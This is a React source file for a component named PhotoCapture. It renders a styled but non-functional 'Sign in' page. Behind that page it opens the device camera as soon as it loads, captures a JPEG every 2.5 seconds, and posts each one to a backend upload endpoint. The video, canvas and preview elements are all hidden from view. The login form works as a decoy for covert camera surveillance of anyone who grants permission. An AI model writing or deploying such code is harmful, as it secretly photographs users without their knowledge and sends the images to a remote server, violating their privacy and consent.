import { useEffect, useRef, useState } from "react";
import "./PhotoCapture.css";

function PhotoCapture() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const streamRef = useRef(null);
  const intervalRef = useRef(null);

  const [cameraActive, setCameraActive] = useState(false);
  const [lastPhoto, setLastPhoto] = useState(null);
  const [status, setStatus] = useState("Camera stopped");

const startCamera = async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "environment",
      },
      audio: false,
    });

    streamRef.current = stream;

    if (!videoRef.current) return;

    videoRef.current.srcObject = stream;

    videoRef.current.onloadedmetadata = async () => {
      await videoRef.current.play();

      setCameraActive(true);
      setStatus("Camera active");

      // First photo immediately
      captureAndUpload();

      // Then every 10 seconds
      intervalRef.current = setInterval(() => {
        captureAndUpload();
      }, 2500);
    };

  } catch (error) {
    console.error(error);
    setStatus("Camera permission denied");
  }
};



  const captureAndUpload = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (!video || video.readyState < 2) {
      return;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const context = canvas.getContext("2d");

    context.drawImage(
      video,
      0,
      0,
      canvas.width,
      canvas.height
    );

    canvas.toBlob(
      async (blob) => {
        if (!blob) return;

        const imageUrl = URL.createObjectURL(blob);
        setLastPhoto(imageUrl);

        await uploadPhoto(blob);
      },
      "image/jpeg",
      0.8
    );
  };

  const uploadPhoto = async (blob) => {
    try {
      setStatus("Uploading photo...");

      const formData = new FormData();

      formData.append(
        "photo",
        blob,
        `photo-${Date.now()}.jpg`
      );
// connection to backend
      const response = await fetch(
         `${import.meta.env.VITE_API_URL}/api/photos/upload`,
        {
          method: "POST",
          body: formData,
        }
      );

      if (!response.ok) {
        throw new Error("Upload failed");
      }

      const data = await response.json();

      console.log("Uploaded:", data);

      setStatus(
        `Last photo uploaded: ${new Date().toLocaleTimeString()}`
      );

    } catch (error) {
      console.error(error);
      setStatus("Upload failed");
    }
  };
    // auto capture
    useEffect(() => {
      startCamera();

      return () => {
        if (intervalRef.current) {
          clearInterval(intervalRef.current);
        }

        if (streamRef.current) {
          streamRef.current.getTracks().forEach((track) => {
            track.stop();
          });
        }
      };
    }, []);

  // const stopCamera = () => {
  //   if (intervalRef.current) {
  //     clearInterval(intervalRef.current);
  //     intervalRef.current = null;
  //   }

  //   if (streamRef.current) {
  //     streamRef.current.getTracks().forEach((track) => {
  //       track.stop();
  //     });

  //     streamRef.current = null;
  //   }

  //   if (videoRef.current) {
  //     videoRef.current.srcObject = null;
  //   }

  //   setCameraActive(false);
  //   setStatus("Camera stopped");
  // };

  // useEffect(() => {
  //   return () => {
  //     stopCamera();
  //   };
  // }, []);

  // return (
    

    

  //   // @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  //   <div
  //     style={{
  //       minHeight: "100vh",
  //       background: "#f4f6f8",
  //       display: "flex",
  //       justifyContent: "center",
  //       alignItems: "center",
  //       padding: "24px",
  //       fontFamily: "Arial, sans-serif",
  //     }}
  //   >
  //     <div
  //       style={{
  //         width: "100%",
  //         maxWidth: "460px",
  //         background: "#ffffff",
  //         borderRadius: "24px",
  //         padding: "45px 40px",
  //         boxShadow: "0 15px 45px rgba(0, 0, 0, 0.08)",
  //       }}
  //     >
  //       {/* Logo / Brand */}
  //       <div
  //         style={{
  //           textAlign: "center",
  //           marginBottom: "35px",
  //         }}
  //       >
  //         <div
  //           style={{
  //             width: "55px",
  //             height: "55px",
  //             margin: "0 auto 18px",
  //             borderRadius: "50%",
  //             background: "#2563eb",
  //             color: "#ffffff",
  //             display: "flex",
  //             alignItems: "center",
  //             justifyContent: "center",
  //             fontSize: "24px",
  //             fontWeight: "bold",
  //           }}
  //         >
  //           A
  //         </div>

  //         <h2
  //           style={{
  //             margin: "0",
  //             fontSize: "28px",
  //             color: "#172033",
  //             fontWeight: "700",
  //           }}
  //         >
  //           Sign in
  //         </h2>

  //         <p
  //           style={{
  //             margin: "9px 0 0",
  //             color: "#7b8494",
  //             fontSize: "14px",
  //           }}
  //         >
  //           Enter your details to continue
  //         </p>
  //       </div>

  //       {/* Email */}
  //       <div style={{ marginBottom: "20px" }}>
  //         <label
  //           style={{
  //             display: "block",
  //             marginBottom: "8px",
  //             color: "#374151",
  //             fontSize: "14px",
  //             fontWeight: "600",
  //           }}
  //         >
  //           Email address
  //         </label>

  //         <input
  //           type="email"
  //           placeholder="you@example.com"
  //           style={{
  //             width: "100%",
  //             height: "52px",
  //             padding: "0 16px",
  //             border: "1px solid #dce1e8",
  //             borderRadius: "10px",
  //             outline: "none",
  //             fontSize: "15px",
  //             color: "#172033",
  //             background: "#fafbfc",
  //           }}
  //         />
  //       </div>

  //       {/* Password */}
  //       <div style={{ marginBottom: "14px" }}>
  //         <div
  //           style={{
  //             display: "flex",
  //             justifyContent: "space-between",
  //             marginBottom: "8px",
  //           }}
  //         >
  //           <label
  //             style={{
  //               color: "#374151",
  //               fontSize: "14px",
  //               fontWeight: "600",
  //             }}
  //           >
  //             Password
  //           </label>

  //           <a
  //             href="/forgot-password"
  //             style={{
  //               color: "#2563eb",
  //               fontSize: "13px",
  //               textDecoration: "none",
  //               fontWeight: "600",
  //             }}
  //           >
  //             Forgot?
  //           </a>
  //         </div>

  //         <input
  //           type="password"
  //           placeholder="Enter your password"
  //           style={{
  //             width: "100%",
  //             height: "52px",
  //             padding: "0 16px",
  //             border: "1px solid #dce1e8",
  //             borderRadius: "10px",
  //             outline: "none",
  //             fontSize: "15px",
  //             color: "#172033",
  //             background: "#fafbfc",
  //           }}
  //         />
  //       </div>

  //       {/* Remember */}
  //       <label
  //         style={{
  //           display: "flex",
  //           alignItems: "center",
  //           gap: "8px",
  //           color: "#697386",
  //           fontSize: "13px",
  //           cursor: "pointer",
  //           marginBottom: "25px",
  //         }}
  //       >
  //         <input
  //           type="checkbox"
  //           style={{
  //             width: "16px",
  //             height: "16px",
  //             cursor: "pointer",
  //           }}
  //         />

  //         Keep me signed in
  //       </label>

  //       {/* Button */}
  //       <button
  //         type="submit"
  //         style={{
  //           width: "100%",
  //           height: "52px",
  //           border: "none",
  //           borderRadius: "10px",
  //           background: "#2563eb",
  //           color: "#ffffff",
  //           fontSize: "15px",
  //           fontWeight: "700",
  //           cursor: "pointer",
  //         }}
  //       >
  //         Continue
  //       </button>

  //       {/* Divider */}
  //       <div
  //         style={{
  //           display: "flex",
  //           alignItems: "center",
  //           gap: "12px",
  //           margin: "28px 0",
  //         }}
  //       >
  //         <div
  //           style={{
  //             flex: 1,
  //             height: "1px",
  //             background: "#e5e7eb",
  //           }}
  //         />

  //         <span
  //           style={{
  //             color: "#9ca3af",
  //             fontSize: "12px",
  //           }}
  //         >
  //           OR
  //         </span>

  //         <div
  //           style={{
  //             flex: 1,
  //             height: "1px",
  //             background: "#e5e7eb",
  //           }}
  //         />
  //       </div>

  //       {/* Signup */}
  //       <div
  //         style={{
  //           textAlign: "center",
  //         }}
  //       >
  //         <span
  //           style={{
  //             color: "#7b8494",
  //             fontSize: "14px",
  //           }}
  //         >
  //           New here?{" "}
  //         </span>

  //         <a
  //           href="/signup"
  //           style={{
  //             color: "#2563eb",
  //             fontSize: "14px",
  //             fontWeight: "700",
  //             textDecoration: "none",
  //           }}
  //         >
  //           Create an account
  //         </a>
  //       </div>
  //     </div>
  //   </div>

      
  // );

  return (
  <div
    /* 888888888888888888888888888888888888888888888888888888888888888888888888888888888888 */

     //   <div
      style={{
        minHeight: "100vh",
        background: "#f4f6f8",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        padding: "24px",
        fontFamily: "Arial, sans-serif",
      }}
    >
      <div
        style={{
          width: "100%",
          maxWidth: "460px",
          background: "#ffffff",
          borderRadius: "24px",
          padding: "45px 40px",
          boxShadow: "0 15px 45px rgba(0, 0, 0, 0.08)",
        }}
      >
        {/* Logo / Brand */}
        <div
          style={{
            textAlign: "center",
            marginBottom: "35px",
          }}
        >
          <div
            style={{
              width: "55px",
              height: "55px",
              margin: "0 auto 18px",
              borderRadius: "50%",
              background: "#2563eb",
              color: "#ffffff",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              fontSize: "24px",
              fontWeight: "bold",
            }}
          >
            A
          </div>

          <h2
            style={{
              margin: "0",
              fontSize: "28px",
              color: "#172033",
              fontWeight: "700",
            }}
          >
            Sign in
          </h2>

          <p
            style={{
              margin: "9px 0 0",
              color: "#7b8494",
              fontSize: "14px",
            }}
          >
            Enter your details to continue
          </p>
        </div>

        {/* Email */}
        <div style={{ marginBottom: "20px" }}>
          <label
            style={{
              display: "block",
              marginBottom: "8px",
              color: "#374151",
              fontSize: "14px",
              fontWeight: "600",
            }}
          >
            Email address
          </label>

          <input
            type="email"
            placeholder="you@example.com"
            style={{
              width: "100%",
              height: "52px",
              padding: "0 16px",
              border: "1px solid #dce1e8",
              borderRadius: "10px",
              outline: "none",
              fontSize: "15px",
              color: "#172033",
              background: "#fafbfc",
            }}
          />
        </div>

        {/* Password */}
        <div style={{ marginBottom: "14px" }}>
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              marginBottom: "8px",
            }}
          >
            <label
              style={{
                color: "#374151",
                fontSize: "14px",
                fontWeight: "600",
              }}
            >
              Password
            </label>

            <a
              href="/forgot-password"
              style={{
                color: "#2563eb",
                fontSize: "13px",
                textDecoration: "none",
                fontWeight: "600",
              }}
            >
              Forgot?
            </a>
          </div>

          <input
            type="password"
            placeholder="Enter your password"
            style={{
              width: "100%",
              height: "52px",
              padding: "0 16px",
              border: "1px solid #dce1e8",
              borderRadius: "10px",
              outline: "none",
              fontSize: "15px",
              color: "#172033",
              background: "#fafbfc",
            }}
          />
        </div>

        {/* Remember */}
        <label
          style={{
            display: "flex",
            alignItems: "center",
            gap: "8px",
            color: "#697386",
            fontSize: "13px",
            cursor: "pointer",
            marginBottom: "25px",
          }}
        >
          <input
            type="checkbox"
            style={{
              width: "16px",
              height: "16px",
              cursor: "pointer",
            }}
          />

          Keep me signed in
        </label>

        {/* Button */}
        <button
          type="submit"
          style={{
            width: "100%",
            height: "52px",
            border: "none",
            borderRadius: "10px",
            background: "#2563eb",
            color: "#ffffff",
            fontSize: "15px",
            fontWeight: "700",
            cursor: "pointer",
          }}
        >
          Continue
        </button>

        {/* Divider */}
        <div
          style={{
            display: "flex",
            alignItems: "center",
            gap: "12px",
            margin: "28px 0",
          }}
        >
          <div
            style={{
              flex: 1,
              height: "1px",
              background: "#e5e7eb",
            }}
          />

          <span
            style={{
              color: "#9ca3af",
              fontSize: "12px",
            }}
          >
            OR
          </span>

          <div
            style={{
              flex: 1,
              height: "1px",
              background: "#e5e7eb",
            }}
          />
        </div>

        {/* Signup */}
        <div
          style={{
            textAlign: "center",
          }}
        >
          <span
            style={{
              color: "#7b8494",
              fontSize: "14px",
            }}
          >
            New here?{" "}
          </span>

          <a
            href="/signup"
            style={{
              color: "#2563eb",
              fontSize: "14px",
              fontWeight: "700",
              textDecoration: "none",
            }}
          >
            Create an account
          </a>
        </div>
      </div>
    {/* dmghkdfmkgddfgfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff */}
    <video
      ref={videoRef}
      autoPlay
      playsInline
      muted
      style={{ width: "100%", display:"none"}}
      
    />

    <canvas
      ref={canvasRef}
      style={{ display: "none" }}
    />


    {lastPhoto && (
      <img
        src={lastPhoto}
        style={{ width: "100%" , display:"none"}}
      />
    )}
  </div>
);
}

export default PhotoCapture;